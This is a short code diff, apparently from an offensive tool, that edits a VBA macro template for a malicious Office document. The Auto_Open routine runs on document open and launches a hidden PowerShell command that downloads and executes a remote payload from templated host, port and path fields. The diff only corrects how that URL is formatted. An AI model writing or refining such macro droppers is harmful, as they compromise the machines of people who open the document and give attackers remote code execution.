@@ -3,6 +3,6 @@ Auto_Open
 End Sub
 Sub Auto_Open()
 Dim str As String
-str = "cmd /c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('{http}{ip}{port}{raw_payload}');"
+str = "cmd /c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw_payload}');"
 Shell str
 End Sub
